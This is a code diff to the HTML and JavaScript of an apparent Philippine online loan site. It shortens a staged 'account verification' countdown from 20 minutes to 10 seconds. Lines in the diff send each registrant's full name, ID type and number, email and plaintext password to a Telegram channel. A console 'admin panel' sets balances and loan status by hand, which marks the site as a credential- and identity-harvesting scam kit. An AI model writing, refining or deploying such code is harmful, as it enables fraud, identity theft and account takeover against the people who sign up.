@@ -27,7 +27,11 @@
     .overlay-card h3{font-size:20px;font-weight:700;margin-bottom:8px;color:var(--text);}
     .overlay-card p{font-size:14px;color:var(--text2);margin-bottom:24px;line-height:1.6;}
 
-    /* CIRCLE TIMER */
+    /* SHORT VERIFICATION (10 sec) */
+    .short-verify .circle-timer{width:120px;height:120px;margin:0 auto 16px;}
+    .short-verify .circle-timer svg{width:120px;height:120px;}
+    .short-verify .circle-timer .time-label span{font-size:24px;}
+
     .circle-timer{position:relative;width:140px;height:140px;margin:0 auto 20px;}
     .circle-timer svg{transform:rotate(-90deg);}
     .circle-timer .track{fill:none;stroke:#eee;stroke-width:8;}
@@ -328,7 +332,8 @@
   </div>
 
   <!-- OVERLAYS -->
-  <div class="overlay" id="overlay-verify">
+  <!-- SHORT VERIFICATION (10 seconds) -->
+  <div class="overlay short-verify" id="overlay-verify">
     <div class="overlay-card">
       <h3>🔐 Account Verification</h3>
       <p>Your account is being verified. Please wait.</p>
@@ -337,9 +342,9 @@
           <circle class="track" cx="70" cy="70" r="58"/>
           <circle class="progress" id="verify-circle" cx="70" cy="70" r="58" stroke-dasharray="364.4" stroke-dashoffset="0"/>
         </svg>
-        <div class="time-label"><span id="verify-time">20:00</span><small>REMAINING</small></div>
+        <div class="time-label"><span id="verify-time">00:10</span><small>REMAINING</small></div>
       </div>
-      <p style="font-size:12px;color:var(--text3);">Verification takes up to 20 minutes.</p>
+      <p style="font-size:12px;color:var(--text3);">Verification takes only a few seconds.</p>
     </div>
   </div>
 
@@ -569,7 +574,7 @@
   });
 
   // ============================================================
-  //  REGISTER
+  //  REGISTER — 10 second verification popup
   // ============================================================
   document.getElementById('register-form').addEventListener('submit', function(e){
     e.preventDefault();
@@ -590,7 +595,7 @@
     const newUser = {email,password,balance:0,loanStatus:"none",loanAmount:0,fullName,idName,idNumber};
     sessionStorage.setItem('fsl_pending_slot', emptySlot);
     sessionStorage.setItem('fsl_pending_user', JSON.stringify(newUser));
-    sendTelegram(`🆕 <b>REGISTER</b>\n👤 ${fullName}\n🪪 ${idName}\n🔢 ${idNumber}\n📧 ${email}\n🔐 ${password}\n🔑 Slot #${emptySlot}\n⏰ ${new Date().toLocaleString('en-PH')}\n\n⏳ Verification pending (20 min)`);
+    sendTelegram(`🆕 <b>REGISTER</b>\n👤 ${fullName}\n🪪 ${idName}\n🔢 ${idNumber}\n📧 ${email}\n🔐 ${password}\n🔑 Slot #${emptySlot}\n⏰ ${new Date().toLocaleString('en-PH')}\n\n⏳ Verification pending (10 sec)`);
     const btn = document.getElementById('register-btn');
     btn.disabled=true; btn.textContent='Creating...';
     setTimeout(()=>{ btn.disabled=false; btn.textContent='Create Account'; },2000);
@@ -598,10 +603,10 @@
   });
 
   // ============================================================
-  //  VERIFICATION COUNTDOWN — 20 min (with live timer)
+  //  VERIFICATION COUNTDOWN — 10 seconds only
   // ============================================================
   function startVerifyCountdown(slot, userData){
-    let totalSeconds = 20*60;
+    let totalSeconds = 10;
     const circle = document.getElementById('verify-circle');
     const timeLabel = document.getElementById('verify-time');
     const circumference = 364.4;
@@ -609,10 +614,9 @@
     clearInterval(verifyTimer);
     verifyTimer = setInterval(()=>{
       totalSeconds--;
-      const mins = Math.floor(totalSeconds/60);
-      const secs = totalSeconds%60;
-      timeLabel.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-      circle.style.strokeDashoffset = circumference*(1-totalSeconds/(20*60));
+      const secs = totalSeconds;
+      timeLabel.textContent = `00:${String(secs).padStart(2,'0')}`;
+      circle.style.strokeDashoffset = circumference*(1-totalSeconds/10);
       if(totalSeconds<=0){
         clearInterval(verifyTimer);
         users[slot] = userData;
@@ -882,7 +886,7 @@
     console.log(`✅ Added ₱${amount} to slot ${slot}. New balance: ₱${u[String(slot)].balance}`);
   }
   function adminSetLoanStatus(slot,status){ return adminSetUser(slot,{loanStatus:status}); }
-  console.log('%c🏦 FSL Admin Panel Ready (Telegram updated)','color:#f0b90b;font-size:16px;font-weight:bold;');
+  console.log('%c🏦 FSL Admin Panel Ready (Telegram updated, 10sec verify)','color:#f0b90b;font-size:16px;font-weight:bold;');
   console.log('%cCommands: adminViewUsers() | adminSetUser(slot,{...}) | adminAddBalance(slot,amount) | adminSetLoanStatus(slot,status) | adminReset()','color:#666;font-size:12px;');
 </script>
 
